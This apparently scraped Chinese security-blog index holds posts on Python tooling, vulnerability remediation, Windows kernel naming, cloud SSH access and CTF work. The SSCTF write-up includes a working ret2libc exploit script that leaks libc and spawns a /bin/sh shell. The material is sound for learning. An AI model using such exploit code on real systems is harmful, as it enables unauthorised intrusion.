prepend the Anaconda install location to PATH in your /home//.bash_profile ?”，是否自动添加环境变量到.bash_profile文件中，输入“yes\"，自动添加；输入”no\"，则需要自行手动添加。如果你使用的是zsh，需要在.zshrc文件中自行添加环境变量。 提示”Thank you for installing Anaconda!”,安装完成。 source一下或重启终端使新加的环境变量生效 source ~/.bash_profile # source ~/.zshrc ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:2","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"3. 卸载 ``` conda install anaconda-clean anaconda-clean #清除个人配置 rm -r /Users/XXXX/.anaconda_backup/... #删除备份，路径可能不同 rm -rf /anaconda3 vi ~/.bash_profile #删除环境变量 # vi ~/.zshrc zsh用户执行这一条 rm -rf ~/.condarc ~/.conda ~/.continuum #删除可能存在的隐藏文件 ``` ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:3:3","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"三、方案使用 不做任何设置的前提下，安装完anaconda后，会设置为自动启动anaconda环境，默认为base环境。对于是否设置自动启动anaconda环境可以使用如下命令进行更改： # 取消自动启动 conda config auto_activate_base false # 设置自动启动 conda condif auto_activate_base true anaconda常用的命令 #查看conda版本 conda --version #更新conda版本 conda update conda #查看安装了哪些依赖库 conda list #创建新的python环境 conda create --name myenv #创建特定python版本的环境 conda create -n myenv python=3.7 #创建新环境并指定包含的库 conda create -n myenv scipy #创建新环境病指定特定版本的库 conda create -n myenv scipy=0.15.0 #复制环境 conda create --name myclone --clone myenv #查看是不是复制成功了 conda info --envs #激活、进入某个环境 source activate myenv #退出环境 source deactivate #删除环境 conda remove --name myenv --all #查看当前的环境列表 conda info --envs conda env list #查看某个环境下安装的库 conda list -n myenv #查找包 conda search XXX #安装包 conda install XXX #更新包 conda update XXX #删除包 conda remove XXX #安装到指定环境 conda install -n myenv XXX ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:4:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Tech"],"content":"四、总结 Anaconda是我目前为止觉得最简单的Python管理实践方式，也可能是我对其他的了解不够深入。话说回来，适合自己的才是最好的，你觉得呢？ ","date":"2020-02-09","objectID":"/2020/02/anaconda3/:5:0","tags":["Python","Anaconda3"],"title":"Mac下的多版本Python管理实践","uri":"/2020/02/anaconda3/"},{"categories":["Vuln"],"content":"Vuln Cyber关于漏洞修复的八种最佳实践形式","date":"2020-02-09","objectID":"/vuln/theory/","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"漏洞修复的八种最佳实践 ","date":"2020-02-09","objectID":"/vuln/theory/:0:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"前言 目前，企业漏洞修复面临的最严峻挑战包括复杂的基础架构、分布式应用程序、不规则无管理堆栈。为了防止威胁或控制漏洞影响范围，当今的企业必须具备相应的政策，流程和工具来进行：漏洞的分析和评估、漏洞优先级的筛选以及自动化修复漏洞。以下将介绍八种漏洞修复的最佳实践方式，以帮助克服当今动态和复杂环境中漏洞修复的挑战和要求。 ","date":"2020-02-09","objectID":"/vuln/theory/:1:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"一、Continuous Detection（持续性检测） 传统的漏洞扫描方式是一种周期性、间断式扫描，在两次扫描的间隙，漏洞状态是不确定的。因此，对于目标必须实行持续性检测，使得安全研究员可以随时知道当前的安全状况。因此，前两个最佳实践聚焦于如何有效实现漏洞的持续发现和检测。 在当今动态、始终处于连接状态且无边界的环境中，连续检测尤其重要。 它影响受到攻击的公司服务器，而且还影响短暂的云实例和容器，高度公开的Web应用程序，以及与网络持续连接的移动设备和IoT端点。 理论上说，企业可以使用一些公共资源，例如MITER的CVE（常见漏洞披露）列表和美国政府的国家漏洞数据库（NVD），主动扫描其资产并检测已发布的漏洞。 由事件响应和安全团队论坛（FIRST）维护的通用漏洞评分系统（CVSS）是评估漏洞严重性的良好资源。 但是，传统的主动扫描的方法会影响扫描资产的可用性（降低性能、影响资产正常运行等），因此漏洞扫描方案通常无法持续运行。 持续检测的另一个障碍是漏洞的范围和速度之快，最近三年暴露的漏洞数量是前三年的两倍。如果支持的漏洞数据库中没有最新的漏洞，对资产的扫描结果就可能存在误差。 下面给出持续性检测的3种实践方式： ","date":"2020-02-09","objectID":"/vuln/theory/:2:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"1. 基于主机的扫描的频率要高于基于网络的扫描的频率 基于网络的扫描器在扫描网络服务时会增加大量开销，而且需要注意不同的环境进行不同的配置设置，打开防火墙端口等。 基于主机的扫描不会遍历网络。 它们消除了网络开销，并允许进行持续扫描。（降低因为网络造成的扫描开销） ","date":"2020-02-09","objectID":"/vuln/theory/:2:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"2. 扫描镜像而不是实例 在现代的云原生应用程序中，大多数服务器实例是从一个镜像安装的。 扫描镜像而不是扫描实例，可以持续进行检测而又不会占用网络资源。（实例是从镜像创建而来，扫描镜像可以直接确认漏洞源头） ","date":"2020-02-09","objectID":"/vuln/theory/:2:2","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"3. 使用“无扫描”无中断的方法来增强主动扫描 使用来自现有DevOps，安全和IT数据库（例如补丁/资产管理系统）的数据，对所有网络节点上的潜在漏洞进行基于无规则的“无扫描”模式分析。 将这些无中断的“无扫描”结果与定期主动扫描的结果合并在一起后，企业可以在不影响性能的情况下实现对漏洞的接近实时可见性的状态查询和观察。 可以使用开源工具（例如osquery和QRadar）来实现此方法。（最大程度降低扫描行为对企业生产环境产生的影响，不影响系统正常运行） ","date":"2020-02-09","objectID":"/vuln/theory/:2:3","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"二、Smart Prioritization（智能优先级排序） 传统漏洞管理系统依靠外部指标来对漏洞进行优先级排序。 一种常见的指标是CVSS评分，它根据攻击媒介，可能受影响的组件的范围，机密数据的风险级别以及对可用性的影响等特征来反映漏洞的严重性。 但是，漏洞风险管理并不罕见。 纳入恶意软件的漏洞中，有44％的CVSS评分较低或中等。也就是说，单纯靠CVSS评分来管理漏洞是远远不够的。 下面给出智能优先级的1种实践方式： ","date":"2020-02-09","objectID":"/vuln/theory/:3:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"4. 在评估风险等级并由此判定漏洞的优先级时，应考虑攻击向量的多少和攻击环境的广泛程度 将各种外部和内部数据源进行关联，更好地了解企业独特环境中特定漏洞的严重性。 外部数据源比如CVSS评分以及威胁情报数据库，内部数据源是企业的资产管理和变更管理系统，以了解受到漏洞威胁的资产的业务重要性和安全状况。（大众标准和特定环境标准综合使用进行漏洞优先级评定，理论结合实际） 例子：在一个基于公有云的工作环境中发现了一个高CVSS评分的漏洞，但是该漏洞只能通过USB进行利用。该企业的基础架构和云监控堆栈中的信息表明，所有可能受此漏洞影响的资产都是基于云的。此时，可以将该漏洞的安全级别划分为低优先级，因为它无法在企业的物理环境中加以利用，不会造成过大的影响。 ","date":"2020-02-09","objectID":"/vuln/theory/:3:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"三、Orchestrated and Automated Remediation（精心设计和自动化的漏洞修复） 漏洞管理的首要目标是进行快速有效的修复。接下来的三个最佳实践可以为以补救为中心进行漏洞管理提供思路： ","date":"2020-02-09","objectID":"/vuln/theory/:4:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"5. 为所有相关团队维护单一的事实来源 企业通常有多个团队进行漏洞修复，例如安全团队负责漏洞检测，然后由IT或DevOps团队进行补救。有效的协作对于创建封闭的检测补救环至关重要。团队的专用数据库，流程和工具堆栈必须紧密集成到精心规划的、共享的单个事实来源的漏洞管理平台中。最佳实践可以在平台内部实施，也可以通过第三方解决方案来实现。（完善响应工作流，确保输入单一，避免多输入造成的歧义和混乱） ","date":"2020-02-09","objectID":"/vuln/theory/:4:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"6. 补丁并非全部内容 漏洞补丁并不是唯一的解决方案，也可以采取其他补救措施，例如配置管理和补偿控件，关闭进程，会话或模块。最佳补救方法（或方法的组合）因漏洞而异。为了实现最佳实践，基于组织的累积漏洞管理经验，维护有关如何将最佳补救方案与漏洞相匹配的知识库非常重要，也可以利用依赖于非常大的数据集的第三方知识库。（搜集并管理内部的漏洞响应数据库，也可以包含第三方的漏洞响应数据库） ","date":"2020-02-09","objectID":"/vuln/theory/:4:2","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"7. 补救措施手册 为了与当今威胁环境的可扩展性以及增长速度相匹配，漏洞修复必须尽可能自动化。实现这种自动化的一种有效方法是创建针对企业环境的预定义剧本。下面是一个简单的剧本场景： 有一些工具支持现成的和可自定义的自动修复工作流。 Vulcan Cyber等漏洞管理平台附带一个工作流库，可以对其进行自定义以满足企业的特定要求。（根据某一类企业假设某些漏洞发生的情况，预先设定一套响应流程，也就是漏洞响应的演习） ","date":"2020-02-09","objectID":"/vuln/theory/:4:3","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"四、Constant Metrics-Based Improvement（基于恒定指标的改进） ","date":"2020-02-09","objectID":"/vuln/theory/:5:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"8. 使用漏洞管理指标来不断改进和优化检测、优先级划分和补救过程 最佳实践的重要部分是了解哪些漏洞管理指标很重要。诸如漏洞计数、检测到的漏洞的平均CVSS分数、运行的扫描次数或基于供应商的严重性等纯粹的量化指标无法提供有关漏洞管理工作有效性的有意义的建议。如本博客中有关漏洞指标的更详细讨论所述，更有意义的指标是定性的，例如覆盖率，漏洞停留时间，一段时间内每项资产的平均漏洞数量以及满足SLA的程度。（使用量化的数据进行漏洞管理流程的迭代优化） ","date":"2020-02-09","objectID":"/vuln/theory/:5:1","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Vuln"],"content":"最后说明 Vulcan Cyber从流程开头进行设计，主要是为无缝适应企业环境，以满足其独特的漏洞管理需求。它通过双向API与企业现有的扫描、监视和补救工具集成，以创建自动化的工作流程，以确保端到端漏洞检测、优先级确定和补救。对于参与漏洞修复的所有团队，Vulcan Cyber成为唯一的事实来源，其先进的优先级划分、自动化和协调功能大大缩短了补救时间，同时增强了企业的安全状况。 ","date":"2020-02-09","objectID":"/vuln/theory/:6:0","tags":["vulnw"],"title":"漏洞修复的八种最佳实践","uri":"/vuln/theory/"},{"categories":["Tech"],"content":"Windows内核函数前缀可以表明函数作用，特此总结学习。","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/","tags":["Security","Widnows内核函数"],"title":"Windows内核函数前缀简述","uri":"/WindowsDev/WindowsKernel/"},{"categories":["Tech"],"content":"Windows内核函数前缀简述 Windows内核函数是Windows内核开发中必须要熟悉的函数，其每个函数命名一般都可以直接反映出其用途和作用对象，且函数名都按其所在的层次或模块加上了特定的前缀。了解了这些前缀，在看到函数名时就大致可以知道函数所属的层次和模块。特此对Windows内核函数的前缀做一个汇总，方便查找和学习Windows内核函数。 主要的Windows内核函数前缀罗列如下： Ex：Executive，提供堆管理和同步服务。 Nt：Native，对应于win32 API的内核函数。 Ke：内核层，所有多线程和多处理器的低等级同步活动都发生在内核中。 Zw：Win32子系统存在于用户模式中，所以用户模式中的应用程序可以容易地调用其例程。为了方便，Windows NT在内核模式中实现了一些有Zw前缀名的函数，这些函数可以使驱动程序调用Win32子系统例程。 Hal：硬件抽象层，Hal是Hardware Abstraction Layer的缩写。 Ob：对象管理器，集中控制Windows NT中的各种数据对象，WDM驱动程序仅需要对象管理器维护对象的参考计数，以防止对象被意外删除。 Mm：内存管理器，控制页表，页表定义了虚拟内存到物理内存之间的映射。 Ps：进程结构模块，创建并管理内核模式线程，普通的WDM驱动程序应使用一个独立的线程来循检无中断生成能力的设备。（Ps - Process） Se：安全参考监视器，使文件系统驱动程序执行安全检测。I/O请求到达WDM驱动程序前已经做完了安全检测。  Io：I/O管理，包含许多驱动程序可以使用的服务函数。 Fs：文件系统，Fs是File System的缩写。 Cc：文件缓存管理，Cc表示Cache。 Cm：系统配置管理，Cm是Configuration Manager的缩写。 Pp：“即插即用”管理，Pp表示PnP。（Plug and Play） Rtl：运行时程序库，Rtl是Runtime Library的缩写，包含工具例程，例如列表和串管理例程，内核模式驱动程序可以用这些例程来替代常规的ANSI标准例程，大部分例程可以从其名字上直接看出它的功能。 ","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/:0:0","tags":["Security","Widnows内核函数"],"title":"Windows内核函数前缀简述","uri":"/WindowsDev/WindowsKernel/"},{"categories":["Tech"],"content":"简单记录一下阿里云ECS的搭建过程","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"Aliyun ECS 搭建手记 简单记录一下阿里云服务器的搭建过程，包括最后使用本地ssh进行连接。 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:0:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"一、服务器选择 这个因人而异，看个人。有账号就行，记住实例的登陆密码和远程登录密码（6位）。实例的登陆密码在进行本地ssh登陆的时候需要使用，远程登录密码在使用阿里云的在线shell的时候使用。 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:1:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"二、阿里云服务器（Linux）的几种连接方式简介 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"1. 通过Workench进行连接 配置比较复杂，不建议新手直接使用这种方法进行远程连接管理。但是功能比较强大。 详细配置过程建议参考官方文档：Workbench配置手册 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:1","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"2. 通过VNC进行连接 该连接方式主要是在实例管理页面开启远程管理界面，shell开启在浏览器页面中。 详细配置过程建议参考官方文档：VNC连接配置手册 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:2","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"3. 通过SSH密钥对进行连接 这种方式是我使用的方式，详细说一下步骤，简单实用。几个步骤就可以获取shell连接。 前提条件 已创建密钥对并下载.pem私钥文件 为实例绑定密钥 为实例所在的安全组添加安全组规则，放行对相应端口的访问 通过命令进行配置 找到.pem私钥文件在本地机上的存储路径，例如~/.ssh/ecs.pem。这里我一般都直接放在了~/.ssh路径下 修改私钥文件属性： chmod 400 XXXXXX.pem 进行实例连接： ssh -i ~/.ssh/XXXXX.pem root@实例ip 通过config文件进行配置 打开 ~/.ssh下的config文件，如果没有的话就自己创建一个，文件内容如下： # alias Host alias #主机别名 HostName ip #实例的公网IP地址 Port 22 #这里可以使用其他的端口，但是要注意在安全组中修改端口的出入规则 User root #使用root用户进行登录 IdentityFile XXXXX.pem #指定私钥文件 重启ssh或terminal 进行连接 ssh alias ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:3","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"4. 通过用户名密码验证连接 该方式主要是使用设置的实例登录密码进行连接 输入ssh ssh root@实例ip 输入登录密码即可 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:4","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"5. 通过移动设备进行连接 一般需要使用特定的app进行连接。 详细配置过程建议参考官方文档：移动设备连接配置手册 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:2:5","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["Tech"],"content":"三、总结 Aliyun官方的文档很详细了，强烈建议如果中间出现什么问题，优先参考官方文档。 ","date":"2020-02-05","objectID":"/2020/02/aliyun_ecs/:3:0","tags":["aliyun","ECS"],"title":"Aliyun ECS 搭建手记","uri":"/2020/02/aliyun_ecs/"},{"categories":["CTF"],"content":"简单记录一下Linux平台下的pwn环境的搭建过程","date":"2020-02-05","objectID":"/ctf/pwn/","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"Linux平台下的CTF Pwn环境搭建 ","date":"2020-02-05","objectID":"/ctf/pwn/:0:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"前言 最近遇到很多人想玩CTF，咨询环境问题。为了更好地将研究重心放在技术本身，这里简单整理一下个人的Pwn环境的搭建过程，仅供参考。 ","date":"2020-02-05","objectID":"/ctf/pwn/:1:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"一、操作系统选择 因为是Pwn环境，涉及到Windows平台的比较少，所以一般使用Linux或者MacOS。我个人是一套Linux的虚拟环境搭配MacOS的物理环境，基本能适应所有的Pwn环境要求。 物理环境：MBP 2015 虚拟环境：Ubuntu 18.04 需要注意，Linux的版本太高很多插件容易出问题，所以不建议使用最新版本的Linux系统，最稳定的不是太老旧的就可以。此外，环境因人而异，没有模板，不是固定的，按需分配。 ","date":"2020-02-05","objectID":"/ctf/pwn/:2:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"二、必备一般软件 vim：个人必备，强烈建议学习一点vim的相关知识，可以提高效率，避免安装过多的编辑器或者IDE git：必备，很多高效的插件都是放在GitHub上的 python：必备，建议python3，毕竟python2已经不支持了 pip：必备，有一些插件需要使用pip进行安装 一款编辑器：这个看个人需求，vscode、sublime text等，个人喜欢就好。如果有条件的话，可以设置一下配置，当作一个简单的开发IDE使用，毕竟Pwn环境中开发的代码不会很多。 以上各软件根据官方文档自行安装即可。 ","date":"2020-02-05","objectID":"/ctf/pwn/:3:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"三、Pwn常用软件 涉及到的各种软件的安装，均以Ubuntu平台为例 pwntools 一个ctf框架和漏洞利用开发库，用python开发,必备神器，作用不多解释。 安装方法： $ apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential $ pip install -U setuptools $ pip install --upgrade pip $ pip install --upgrade pwntools 个人使用的是python2版本，需要注意一下。pwntools现在支持python3了，这里给出GitHub地址，有需要的可以参考其readme进行安装python3的pwntools。 支持python3的pwntools 安装完成后，打开python测试, 执行from pwn import *不会报错即可。 （备注：在mac平台下不要使用pip安装，你会怀疑人生的，使用homebrew安装） gdb 动态调试软件，必备。 安装方法： apt-get install gdb peda/pwngdb/gef 这是常见的gdb的三个插件，配合gdb使用可以提升调试效率。 安装pwndbg： git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh 安装peda： git clone https://github.com/longld/peda.git~/peda echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit 安装gef： wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh| sh wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py echo source ~/.gdbinit-gef.py \u003e\u003e ~/.gdbinit 因为在同一时刻只能使用一种插件，而且在解决不同类型的题目时使用不同的插件，因此需要配置三种插件的快捷切换。 首先，gdb使用哪种插件是在.gdbinit文件（一般在root目录下）中使用source进行控制的，我们可以在使用插件时注释掉其他的source命令，即可单独使用某一插件。但是每次都编辑该文件实在是麻烦，因此可以使用脚本进行选择。 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit #这个路径按照你的实际情况修改 # gdbinitfile=/root/Desktop/mode peda=\"source ~/peda/peda.py\" #这个路径按照你的实际情况修改 gef=\"source ~/.gdbinit-gef.py\" #这个路径按照你的实际情况修改 pwndbg=\"source /opt/pwndbg/gdbinit.py\" #这个路径按照你的实际情况修改 sign=$(cat $gdbinitfile | grep -n \"#this place is controled by user's shell\") #此处上面的查找内容要和你自己的保持一致 pattern=\":#this place is controled by user's shell\" number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\"TEST\" if [ $name -eq \"1\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add$peda\" $gdbinitfile echo -e \"Please enjoy the peda!\\n\" elif [ $name -eq \"2\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add$gef\" $gdbinitfile echo -e \"Please enjoy the gef!\\n\" else sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add$pwndbg\" $gdbinitfile echo -e \"Please enjoy the pwndbg!\\n\" fi } echo -e \"Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\" read -p \"Input your choice:\" num if [ $num -eq \"1\" ];then Mode_change $num elif [ $num -eq \"2\" ];then Mode_change $num elif [ $num -eq \"3\" ];then Mode_change $num else echo -e \"Error!\\nPleasse input right number!\" fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9 现在我们把这个shell脚本放到一个环境变量指向的路径里面，查看一下自己的路径，shell脚本放进去 echo $PATH 我放在了/usr/local/sbin目录下，这样就可以执行 gdb.sh，输入对应插件的数字就可以选择使用哪个插件，无需手动更改.gdbinit文件。 实在不会可以参考这位师傅的教程：自动选择gdb插件 32位程序支持 必备，装它。 apt-get install libc6-dev-i386 qemu 这是arm的pwn环境，前期可以不安装，但是终究是逃不过的，建议一步到位。 安装qemu： sudo apt-get install qemu sudo apt-get install qemu-system qemu-user-static binfmt-support 安装依赖库： sudo apt-get install -y gcc-arm-linux-gnueabi sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git LibcSearcher 泄露libc库中函数的偏移的库，建议安装，可以节省时间，提高效率。 安装LibcSearcher： sudo pip install capstone git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher python setup.py develop ROPgadget和one_gadget ROPgadget是用来找gadget的，one_gadget用来寻找libc库中的execve('/bin/sh', NULL, NULL)可以一个gadget就可以getshell，建议安装。 安装ROPgadget： # 先安装Capstone,它是一个轻量级的多平台架构支持的反汇编架构。 sudo apt-get install python-capstone 然后，下载好ROPgadget解压进入文件夹中 python setup.py install 安装one_gadget： sudo apt install ruby gem install one_gadget IDA 静态调试必备，不多解释。这里建议安装52上的版本： 52上的IDA ","date":"2020-02-05","objectID":"/ctf/pwn/:4:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"四、总结 整理这篇文章的目的是希望在玩Pwn的时候可以不用花太多时间在环境上，搭配好一套环境一直用就好了，根据具体情况再进行补充。还是那句话，重心还是要放在技术本身上。 ","date":"2020-02-05","objectID":"/ctf/pwn/:5:0","tags":["CTF","pwn"],"title":"CTF Pwn环境搭建","uri":"/ctf/pwn/"},{"categories":["CTF"],"content":"这道题还是很好玩的，考点也比较丰富，特此总结学习。","date":"2019-10-27","objectID":"/ctf/roarctf/","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"SSCTF2019 PWN题题解 ","date":"2019-10-27","objectID":"/ctf/roarctf/:0:0","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"stackpwn 首先file,checsec走一遍，64位程序，动态链接，开了NX IDA直接看，main函数： 进入vuln看一下： 容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。 到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。 基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了。 ","date":"2019-10-27","objectID":"/ctf/roarctf/:1:0","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"Exp： from pwn import * context.log_level = 'debug' p = process('./stackpwn') offset = 0x18 #0x10+0x8 pop_rdi_ret = 0x0000000000400933 #ROPgadet : rdi bin_sh = 0x0000000000400954 # address of /bin/sh elf = ELF(\"./stackpwn\") libc = elf.libc # leak libc payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address p.recvuntil(\"instructions...\\n\") p.sendline(payload) #get puts address puts_addr = u64(p.recv(6).ljust(8,'\\x00')) #get libc address puts_base = libc.symbols['puts'] libc_base = puts_addr - puts_base #get system address sys_addr = libc_base + libc.symbols['system'] #second loop payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr) p.sendline(payload2) p.interactive() ","date":"2019-10-27","objectID":"/ctf/roarctf/:1:1","tags":["SSCTF","CTF"],"title":"SSCTF2019 PWN题题解","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"这道题还是很好玩的，考点也比较丰富，特此总结学习。","date":"2019-10-26","objectID":"/ctf/roarctf/","tags":["Roarctf","CTF"],"title":"RoarCTF Misc Davinci-Cipher writeup","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"RoarCTF MISC Davinci_Cipher 这道题实在是可惜，第一天磕了半天没出来。第二天灵光乍现，但是晚了一分钟，比赛结束了。。。唉。。后来看官方的wp，思路步骤全是一样的。。。心痛。。 ","date":"2019-10-26","objectID":"/ctf/roarctf/:0:0","tags":["Roarctf","CTF"],"title":"RoarCTF Misc Davinci-Cipher writeup","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"初步分析 题目给了两个附件，一个txt，一个流量包。打开txt看一下： U+1F643U+1F4B5U+1F33FU+1F3A4U+1F6AAU+1F30FU+1F40EU+1F94BU+1F6ABU+1F606U+1F383U+1F993U+2709U+1F33FU+1F4C2U+2603U+1F449U+1F6E9U+2705U+1F385U+2328U+1F30FU+1F6E9U+1F6A8U+1F923U+1F4A7U+1F383U+1F34DU+1F601U+2139U+1F4C2U+1F6ABU+1F463U+1F600U+1F463U+1F643U+1F3A4U+2328U+1F601U+1F923U+1F3A4U+1F579U+1F451U+1F6AAU+1F374U+1F579U+1F607U+1F374U+1F40EU+2705U+2709U+1F30FU+23E9U+1F40DU+1F6A8U+2600U+1F607U+1F3F9U+1F441U+1F463U+2709U+1F30AU+1F6A8U+2716 很明显是unicode码，这里首先就想到了可能会用到代码点去进行转换（也就是这个第一印象给自己带偏了）。 txt文件没有其他信息了，直接开流量包吧： 首先注意到流量中有一个图片，直接导出特定包，然后把图片提取出来： 然后开始各种蹂躏这个图，然并卵，没有任何有价值的信息。思路不对，而且没有发现图片和txt的丝毫关联。 ","date":"2019-10-26","objectID":"/ctf/roarctf/:1:0","tags":["Roarctf","CTF"],"title":"RoarCTF Misc Davinci-Cipher writeup","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"进一步分析 回到流量包，继续磕，发现了另外一个猫腻：存在USB协议流量 分析USB流量 发现了一个Wacom PTH-660的设备。果断google，是一个数位板。之前遇到过一个类似的ctf题目，大概猜测是通过数位板进行绘画，然后在流量中体现。 分析数位板流量 USB流量的数据段是Leftover Capture Data，发现的数位板的src为1.9.1，frame长度为54。直接筛选可能的有效流量：(usb.src == “1.9.1”)\u0026\u0026(frame.len == 54)并导出筛选出后的分组usb.pcapng。 分析数据段 USB协议可以从USB协议了解详细的过程，而且其中包含了对数位板的介绍。这里主要看一下与这道题目相关的数位板： 需要对该数位板的数据格式做一个分析：x，y坐标以小端存储。结合之前在流量包中看到的数据，我们可以猜测到坐标存储的位置。红框为坐标高位bit，同一时间内变 化小于绿框(低位bit)变化率，橙框变化猜测为压力值，笔离开画板时压力变为0。 ","date":"2019-10-26","objectID":"/ctf/roarctf/:2:0","tags":["Roarctf","CTF"],"title":"RoarCTF Misc Davinci-Cipher writeup","uri":"/ctf/roarctf/"},{"categories":["CTF"],"content":"脚本 # coding:utf-8 import sys import os import numpy as np import matplotlib.pyplot as plt 